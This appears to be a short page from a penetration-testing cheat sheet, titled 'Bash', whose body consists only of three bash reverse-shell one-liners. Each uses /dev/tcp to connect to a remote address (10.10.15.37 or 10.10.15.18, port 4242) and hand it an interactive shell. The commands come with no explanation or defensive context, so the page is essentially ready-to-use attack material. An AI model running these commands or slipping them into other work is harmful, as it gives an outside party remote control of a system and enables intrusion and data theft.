---
title: "Bash"
description: ""
summary: ""
date: 2023-09-07T16:06:50+02:00
lastmod: 2023-09-07T16:06:50+02:00
draft: false
weight: 800
toc: true
seo:
  title: "" # custom title (optional)
  description: "" # custom description (recommended)
  canonical: "" # custom canonical URL (optional)
  robots: "" # custom robot tags (optional)
---

```sh
bash -i >& /dev/tcp/10.10.15.37/4242 0>&1
```

```sh
0<&196;exec 196<>/dev/tcp/10.10.15.37/4242; sh <&196 >&196 2>&196
```

```sh
/bin/bash -l > /dev/tcp/10.10.15.18/4242 0<&1 2>&1
```

